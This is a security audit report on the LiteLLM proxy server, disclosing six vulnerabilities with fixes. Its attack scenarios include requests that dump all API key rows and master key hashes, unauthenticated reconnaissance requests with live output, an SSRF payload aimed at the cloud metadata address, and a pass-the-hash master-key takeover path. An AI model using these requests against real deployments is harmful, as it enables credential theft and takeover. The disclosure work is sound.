# LiteLLM Proxy — Security Audit Report

**Date:** 2026-04-21
**Target:** LiteLLM proxy server, commit `b9bedc8153` on `litellm_internal_staging`
**Method:** Source code audit → execution path tracing → live testing against a real proxy instance
**Auditors:** Independent security research
**Methodology:** AutoFyn for finding vulnerabilities, Claude Code for verification and composition into real attacks.
**Live reproduction:** `run_live_tests.sh` / `live_exploit_tests.py`

---

## Summary

We began with 11 claimed vulnerabilities from static analysis. After live testing against a real LiteLLM proxy instance, **4 are confirmed exploitable**, **2 are confirmed at the code level but not live-testable** (enterprise gate / requires mock server), and **5 are not exploitable** due to upstream auth guards that static analysis missed.

| Finding | Live Status | Severity |
|---|---|---|
| F-1: Unauthenticated `/debug/asyncio-tasks` | **Confirmed** | Low |
| F-2: `/spend/keys` leaks all key rows | **Confirmed** | High |
| F-3: Unauthenticated `/metrics/` with PII labels | **Confirmed** | Medium |
| F-4: Unauthenticated `/token` endpoint | **Confirmed** | Medium |
| F-5: Pass-the-hash in `_is_master_key()` | Code confirmed, enterprise-gated | Critical (if enterprise) |
| F-6: MCP OAuth metadata SSRF | Code confirmed, needs mock server | High |
| ~~MCP `.well-known` bypass~~ | **Not exploitable** | — |
| ~~MCP OAuth2 fallback bypass~~ | **Not exploitable** | — |
| ~~`/user/info` v1 IDOR~~ | **Not exploitable** | — |
| ~~`/global/spend/reset` missing gate~~ | **Not exploitable** | — |
| ~~Login cookie flags~~ | Hardening debt only | — |

---

## Attack Scenario: Internal User Credential Harvesting

**Severity:** High
**Precondition:** Any valid LiteLLM API key with `INTERNAL_USER` role
**Confirmed live:** Yes
**Findings used:** F-2

### The Attack

Any internal user can dump every API key row in the system:

```
GET /spend/keys HTTP/1.1
Authorization: Bearer sk-low-privilege-user-key
```

**Live test output:**
```json
[
  {"token": "a5a3577a...", "key_name": "sk-...poFQ", "spend": 0.0, "user_id": null, ...},
  {"token": "1c807cf7...", "key_name": "master-key", "spend": 0.0, ...}
]
```

The response includes token hashes, key names, user IDs, team IDs, budgets, and metadata for every key — including the master key hash. This is confirmed with a real `INTERNAL_USER` key against a live proxy.

### Impact

- Full enumeration of all API keys, users, and teams in the deployment
- Master key hash exposed (enables Chain escalation on Enterprise deployments — see F-5)
- Budget and spend data for all teams visible to any user

### Why it works

The handler has no `user_api_key_dict` parameter, making per-caller filtering structurally impossible:

```python
# litellm/proxy/spend_tracking/spend_management_endpoints.py:52
async def spend_key_fn():  # no caller context
    key_info = await prisma_client.get_data(table_name="key", query_type="find_all")
    return key_info
```

The route is in `spend_tracking_routes`, which `INTERNAL_USER` is permitted to access.

---

## Attack Scenario: Unauthenticated Infrastructure Reconnaissance

**Severity:** Medium
**Precondition:** Network access (no credentials)
**Confirmed live:** Yes
**Findings used:** F-1, F-3, F-4

Three endpoints are accessible without any authentication:

### `/debug/asyncio-tasks` — proxy internals

```
GET /debug/asyncio-tasks HTTP/1.1
(no auth)
```

**Live response:**
```json
{
  "total_active_tasks": 7,
  "by_name": {
    "PrismaClient._db_health_watchdog_loop": 1,
    "SlackAlerting._run_scheduled_daily_report": 1,
    "_monitor_spend_logs_queue": 1,
    "AlertingHangingRequestCheck.check_for_hanging_requests": 1
  }
}
```

Discloses: database type (Prisma), alerting configuration (Slack), monitoring infrastructure.

### `/metrics/` — PII and credential hashes

```
GET /metrics/ HTTP/1.1
(no auth)
```

**Live response (excerpt):**
```
litellm_proxy_failed_requests_metric_total{
  api_key_alias="None",
  hashed_api_key="a5a3577abe90927cca20eac3dc49929b2042e2963d21bfb592b7ce33416f1b0a",
  user_email="None",
  route="/spend/keys"
} 1.0
```

Discloses: API key hashes, user emails, routes accessed, team names. Condition: Prometheus must be enabled (via `callbacks: ["prometheus"]`) and `require_auth_for_metrics_endpoint` must not be set to `true` (the default).

### `/token` — unauthenticated OAuth relay

```
POST /token HTTP/1.1
Content-Type: application/x-www-form-urlencoded
(no auth)

grant_type=authorization_code&code=test&client_id=test
```

**Live response:** `{"detail":"MCP server not found"}` (404, not 401 — auth was never checked)

This is standard for OAuth flows, but combined with F-6 (SSRF via poisoned `token_url`), it becomes an exfiltration channel.

---

## Attack Scenario: SSRF via MCP OAuth Discovery (Code-Level, Not Live-Tested)

**Severity:** High
**Precondition:** Attacker controls an MCP server's HTTP responses (admin registration, DNS hijack, or compromised upstream)
**Confirmed live:** No (requires mock malicious server)
**Findings used:** F-5 (code), F-6 (code)

The MCP OAuth discovery chain fetches attacker-controlled URLs with no SSRF protection:

```python
# litellm/proxy/_experimental/mcp_server/mcp_server_manager.py:1593
response = await client.get(resource_metadata_url)  # no private IP check
```

A malicious MCP server returns `WWW-Authenticate: Bearer resource_metadata="http://169.254.169.254/..."`, and the proxy fetches it. The discovered `token_url` is stored and later called by the unauthenticated `/token` endpoint.

This is a real SSRF primitive confirmed by code review, but live testing requires a controlled mock server that we did not set up.

---

## Attack Scenario: Master Key Takeover via Pass-the-Hash (Enterprise Only)

**Severity:** Critical (on Enterprise deployments)
**Precondition:** Enterprise license + any valid API key + master key hash (from F-2)
**Confirmed live:** No (`/key/regenerate` is enterprise-gated)
**Findings used:** F-2, F-5

The code path exists and is confirmed by static analysis:

```python
# litellm/proxy/spend_tracking/spend_tracking_utils.py:55-69
def _is_master_key(api_key, _master_key):
    is_master_key = secrets.compare_digest(api_key, _master_key)
    if is_master_key:
        return True
    is_master_key = secrets.compare_digest(api_key, hash_token(_master_key))
    if is_master_key:
        return True
    return False
```

`/key/regenerate` calls `_is_master_key(api_key=data.key, ...)` on the request body. An attacker who obtains the master key hash (via F-2) could pass it as `data.key` to rotate the master key.

**However**, live testing showed `/key/regenerate` returns:
```
"Regenerating Virtual Keys is an Enterprise feature"
```

On community/open-source deployments, this chain is blocked. On Enterprise deployments with `LITELLM_LICENSE` set, the code path is reachable and the vulnerability is exploitable.

---

## Individual Finding Details

### F-1: Unauthenticated `/debug/asyncio-tasks`

| Field | Value |
|---|---|
| **Severity** | Low |
| **CWE** | CWE-306 |
| **File** | `litellm/proxy/common_utils/debug_utils.py:53` |
| **Live confirmed** | Yes |

**Fix:** Add `dependencies=[Depends(user_api_key_auth)]` to the route decorator.

---

### F-2: `/spend/keys` Returns All Key Rows to Any Internal User

| Field | Value |
|---|---|
| **Severity** | High |
| **CWE** | CWE-200 |
| **File** | `litellm/proxy/spend_tracking/spend_management_endpoints.py:34-66` |
| **Live confirmed** | Yes — internal user gets all rows including master key hash |

**Fix:** Add `user_api_key_dict` parameter. Filter by caller role.

---

### F-3: Unauthenticated `/metrics/` with PII Labels

| Field | Value |
|---|---|
| **Severity** | Medium (conditional) |
| **CWE** | CWE-306, CWE-359 |
| **File** | `litellm/integrations/prometheus.py:3477` |
| **Live confirmed** | Yes — `hashed_api_key` labels visible with no auth |
| **Condition** | Prometheus enabled, `require_auth_for_metrics_endpoint` not set |

**Fix:** Default `require_auth_for_metrics_endpoint` to `true`.

---

### F-4: Unauthenticated `/token` Endpoint

| Field | Value |
|---|---|
| **Severity** | Medium (SSRF amplifier) |
| **CWE** | CWE-918 |
| **File** | `litellm/proxy/_experimental/mcp_server/discoverable_endpoints.py:589` |
| **Live confirmed** | Yes — returns 404 (not 401) with no auth |

**Note:** Public `/token` is standard for OAuth. The issue is lack of SSRF validation on the outbound request when combined with F-6.

**Fix:** Add URL validation to `exchange_token_with_server()`.

---

### F-5: Pass-the-Hash on Master Key

| Field | Value |
|---|---|
| **Severity** | Critical (Enterprise only) |
| **CWE** | CWE-836 |
| **Files** | `spend_tracking_utils.py:55-69`, `key_management_endpoints.py:3919` |
| **Live confirmed** | No — `/key/regenerate` is enterprise-gated |

**Fix:** Remove hash comparison from `_is_master_key()`.

---

### F-6: MCP OAuth Metadata SSRF

| Field | Value |
|---|---|
| **Severity** | High |
| **CWE** | CWE-918 |
| **File** | `mcp_server_manager.py:1580-1687` |
| **Live confirmed** | No — requires mock malicious MCP server |

**Fix:** Add private IP blocklist and `https://` scheme restriction.

---

## Appendix: Claims Disproved by Live Testing

### MCP `.well-known` Query-String Auth Bypass

**Original claim:** Appending `?x=.well-known` bypasses MCP authentication.

**Live result:** Returns `401 Unauthorized`. The main `user_api_key_auth` middleware runs before the MCP-specific handler and rejects the request. The vulnerable code in `user_api_key_auth_mcp.py:120` is never reached.

The code-level bug exists (`.well-known` substring match on full URL), but it has no security impact because the upstream auth layer blocks unauthenticated requests first.

### MCP OAuth2 Fallback Anonymous Access

**Original claim:** Sending `Authorization: Bearer garbage` grants anonymous MCP access.

**Live result:** Returns `401 Unauthorized` with message "expected to start with 'sk-'". The main auth middleware validates the key format before the MCP fallback handler runs.

Same as above — the code-level bug exists but is masked by the upstream guard.

### `/user/info` v1 IDOR

**Live result:** `403 Forbidden` — route checks enforce `user_id` matching before the handler.

### `/global/spend/reset` Missing Admin Gate

**Live result:** Listed in `master_key_only_routes` — rejected before handler runs.

### Login Cookie Flags

JWT is intentionally returned in response body for JS access. Hardening debt, not exploitable.

---

## Reproduction

### One-command setup (recommended)

```bash
./tests/test_litellm/proxy/security_poc/run_live_tests.sh
```

This starts a dedicated Postgres container, launches the proxy, runs all tests, and tears everything down. Requires: Docker, `uv`.

### Manual

```bash
# Terminal 1
docker run -d --name litellm-security-test-db \
  -e POSTGRES_PASSWORD=testpass123 -e POSTGRES_DB=litellm_test -e POSTGRES_USER=litellm \
  -p 15432:5432 postgres:16-alpine

LITELLM_MASTER_KEY=sk-test-master-key-1234 \
DATABASE_URL=postgresql://litellm:testpass123@localhost:15432/litellm_test \
litellm --config tests/test_litellm/proxy/security_poc/live_test_config.yaml --port 14000

# Terminal 2
python tests/test_litellm/proxy/security_poc/live_exploit_tests.py
```

### Expected output

```
F-1: debug unauth              VULNERABLE
F-2: spend/keys leak           VULNERABLE
F-3: metrics unauth            VULNERABLE
F-4: token unauth              VULNERABLE

4/4 findings confirmed against live proxy
```

---

## Recommended Fix Priority

| Priority | Finding | Fix Effort |
|---|---|---|
| **Immediate** | F-2: Add caller filtering to `/spend/keys` | Small |
| **Immediate** | F-5: Remove hash branch from `_is_master_key()` | Small |
| **High** | F-6: Add SSRF validation to MCP OAuth discovery | Medium |
| **High** | F-4: Add SSRF validation to `/token` relay | Medium |
| **Standard** | F-3: Default `/metrics` to require auth | Small |
| **Standard** | F-1: Add auth to `/debug/asyncio-tasks` | Trivial |
